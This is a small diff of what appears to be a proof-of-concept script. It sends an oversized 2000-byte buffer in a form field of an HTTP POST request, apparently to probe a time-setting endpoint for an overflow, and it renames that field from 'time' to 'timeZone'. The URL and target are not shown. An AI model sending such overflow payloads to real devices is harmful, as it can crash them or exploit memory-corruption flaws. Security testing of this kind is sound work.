@@ -32,7 +32,7 @@ payload = b"a"*2000
 
 data = {
         'timeType':'sync',
-        'time':payload,
+        'timeZone':payload,
     }
 response = requests.post(url, data=data)
 print(response.text)
